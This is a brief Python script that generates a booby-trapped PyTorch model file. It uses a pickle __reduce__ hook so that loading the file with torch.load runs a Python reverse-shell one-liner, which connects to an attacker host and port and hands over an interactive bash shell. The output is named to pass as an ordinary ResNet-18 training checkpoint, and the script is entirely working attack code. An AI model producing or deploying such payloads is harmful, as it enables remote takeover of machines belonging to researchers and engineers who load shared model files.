#!/usr/bin/env python3
import torch, os, sys

LHOST = sys.argv[1] if len(sys.argv) > 1 else "192.168.45.189"
LPORT = sys.argv[2] if len(sys.argv) > 2 else "80"
OUT   = sys.argv[3] if len(sys.argv) > 3 else "resnet18_epoch_099.pt"

class M:
    def __reduce__(self):
        return (os.system, (
            f"python3 -c '"
            f"import socket,subprocess,os;"
            f"s=socket.socket();"
            f"s.connect((\"{LHOST}\",{LPORT}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/bash\",\"-i\"])"
            f"'",))

torch.save(M(), OUT)
print(f"[+] {OUT} ({os.path.getsize(OUT)} bytes) -> {LHOST}:{LPORT}")
